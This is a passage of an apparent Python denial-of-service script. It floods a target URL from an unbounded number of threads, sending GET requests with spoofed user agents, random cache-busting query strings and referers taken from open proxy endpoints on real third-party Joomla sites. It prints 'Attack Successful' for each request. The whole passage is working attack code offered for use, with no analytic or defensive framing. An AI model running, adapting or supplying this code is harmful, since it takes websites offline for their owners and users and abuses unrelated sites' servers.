     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",

]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print ("{0} Attack Successful".format(count))
            except requests.exceptions.ConnectionError:
                print ("TuanCE Are Attack Website...")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[Url Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your Url]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled By User]")
                raise SystemExit()


while True:
    try:
    
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
